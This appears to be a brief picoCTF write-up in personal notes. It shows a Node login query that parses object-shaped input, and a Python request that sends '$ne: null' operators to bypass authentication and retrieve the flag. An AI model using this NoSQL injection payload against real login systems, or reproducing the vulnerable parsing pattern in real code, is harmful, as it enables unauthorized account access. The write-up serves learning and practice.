---
ai_date: '2025-04-27 05:29:57'
ai_summary: MongoDB injection vulnerability exploited using JSON parse to bypass filter
ai_tags:
- json
- mongodb
- injection
created: 2024-11-16T19:49
updated: 2024-11-16T19:51
---

Simple mongodb injection.

```js
const user = await User.findOne({
    email:
    email.startsWith("{") && email.endsWith("}")
        ? JSON.parse(email)
        : email,
    password:
    password.startsWith("{") && password.endsWith("}")
        ? JSON.parse(password)
        : password,
});
```

Since we can provide it with an object, we can just use [$ne - MongoDB Manual v8.0](https://www.mongodb.com/docs/manual/reference/operator/query/ne/#mongodb-query-op.-ne).

```js
{ field: { $ne: value } }
```

```python
import base64
import requests

print(base64.b64decode(requests.post("http://atlas.picoctf.net:63914/login", json={"email": '{"$ne": null}', "password": '{"$ne": null}'}).json()['token']))
```

```flag
picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_784e40e8}
```